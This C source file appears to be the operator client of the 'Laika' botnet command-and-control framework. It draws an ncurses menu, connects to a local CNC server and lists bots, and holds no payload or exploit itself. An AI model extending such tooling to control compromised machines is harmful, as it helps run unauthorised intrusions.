#include "laika.h"
#include "lerror.h"

#include "panel.h"
#include "pclient.h"

#define STRING(x) #x
#define MACROLITSTR(x) STRING(x)

tPanel_client *client;
tPanel_tabs *panel_tabList;
tPanel_list *panel_botList;

void connectToCNC(void *uData) {
    tPanel_listItem *curr;
    int ch;

    /* hide main menu */
    panelL_setHidden(panel_getActiveList(), true);

    /* init global lists */
    panel_tabList = panelL_newTabs("Laika CNC Panel");
    panel_botList = panelL_newList();

    /* init tabs */
    panelL_newListItem(&panel_tabList->list, panel_botList, "Bot List", NULL, NULL);
    panelL_init(&panel_tabList->list);
    panelL_init(panel_botList);

    addstr("Connecting to CNC with pubkey [" LAIKA_PUBKEY "]...");
    refresh();

    client = panelC_newClient();
    panelC_connectToCNC(client, "127.0.0.1", "13337");

    /* main panel loop */
    panel_pushActiveList(&panel_tabList->list);
    while ((ch = panel_getChar()) != 'q' && laikaS_isAlive((&client->peer->sock))) {
        if (!panel_tick(ch)) {
            /* if we got an event to handle, we *probably* have more events to handle so temporarily make ncurses non-blocking */
            if (panelC_poll(client, 0)) {
                panel_setTimeout(0); /* makes ncurses non-blocking */
                panel_draw();
            } else {
                /* wait to poll if we didn't receive any new messages */
                panel_setTimeout(PANEL_CURSES_TIMEOUT);
            }
        } else {
            /* we got input, redraw screen */
            panel_draw();
        }
    }

    /* free bots in botList */
    curr = panel_botList->itemHead;
    while (curr != NULL) {
        panelB_freeBot(curr->uData);
        curr = curr->next;
    }

    /* since panel_botList is a child of one of panel_tabList's items, it 
        gets free'd with panel_tabList. so popping it frees both */
    panel_popActiveList();
    panelC_freeClient(client);

    /* re-show main menu */
    panelL_setHidden(panel_getActiveList(), false);
}

void quitLaika(void *uData) {
    LAIKA_ERROR("quit!\n")
}

int main(int argv, char **argc) {
    tPanel_menu *menu;
    int ch;

    /* init ncurses */
    panel_init();

    menu = panelL_newMenu("Laika v" MACROLITSTR(LAIKA_VERSION_MAJOR) "." MACROLITSTR(LAIKA_VERSION_MINOR));
    panelL_newListItem(&menu->list, NULL, "Quit", quitLaika, NULL);
    panelL_newListItem(&menu->list, NULL, "- Connect to CNC", connectToCNC, NULL);

    /* start main menu */
    panelL_init(&menu->list);
    panel_pushActiveList(&menu->list);
    LAIKA_TRY
        while ((ch = panel_getChar()) != 'q') {
            if (panel_tick(ch))
                panel_draw();
        }
    LAIKA_TRYEND
    panel_popActiveList();

    /* cleanup */
    panel_cleanUp();
    return 0;
}